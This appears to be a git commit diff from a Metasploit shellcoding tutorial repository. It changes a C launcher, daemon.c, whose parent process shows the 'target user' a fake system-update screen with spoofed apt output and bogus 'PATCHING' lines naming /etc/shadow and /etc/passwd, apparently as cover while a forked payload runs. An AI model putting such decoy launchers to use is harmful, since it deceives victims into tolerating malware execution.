5568844075048e526e36863188a980ef0be42d73
root <root@localhost.localdomain>
2019-06-21 08:45:40 +0100

    Metasploit Shellcoding Series (Linux C Lauchers)

--- metasploit-RC[ERB]/shellcoding/C_Lauchers/daemon.c
+++ metasploit-RC[ERB]/shellcoding/C_Lauchers/daemon.c
@@ -34,12 +34,17 @@ fflush(NULL);
 int pid = fork();
    if (pid > 0) {
       /* We are running in parent process (as foreground job). */
+
+
+
+
       printf("Please Wait, Updating system ..\n\n");
       /* Display system information onscreen to target user */
       sleep(1);system("h=$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \"Hostname   :$h\"");
       system("k=$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \"Kernel     :$k\"");
       system("b=$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \"Boot ID    :$b\"");
-      sleep(2);printf("\nHit:1 http://kali.download/kali kali-rolling InRelease\n");
+      sleep(2);printf("\n");
+      system("OP=$(hostnamectl | grep 'Operating' | awk {'print $3'});echo \"Hit:1 http://$OP.download/$OP $OP-rolling/contrib\"");
       printf("------------------------------------------------------\n");
       sleep(1);system("for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=$(date|awk {'print $4,$5,$6'});echo \"$dt - PATCHING: $i\" && sleep 1;done");
       printf("------------------------------------------------------\n");
